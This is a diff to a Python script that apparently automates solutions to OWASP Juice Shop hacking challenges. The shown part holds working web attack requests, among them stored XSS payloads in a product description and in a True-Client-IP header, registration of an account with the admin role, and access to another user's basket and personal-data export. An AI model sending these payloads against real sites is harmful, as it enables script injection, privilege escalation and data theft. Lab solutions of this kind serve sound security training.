@@ -118,5 +118,7 @@ requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src
 # ---- GDPR Data Theft (Steal someone else's personal data without using Injection.)
 requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
 requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
+# ---- HTTP-Header XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> through an HTTP header.)
+requests.get(url+'/rest/saveLoginIp', headers={'True-Client-IP':'<iframe src="javascript:alert(`xss`)">','Authorization':'Bearer '+login['token']})
 # ---- View Basket (View another user's shopping basket.)
 requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
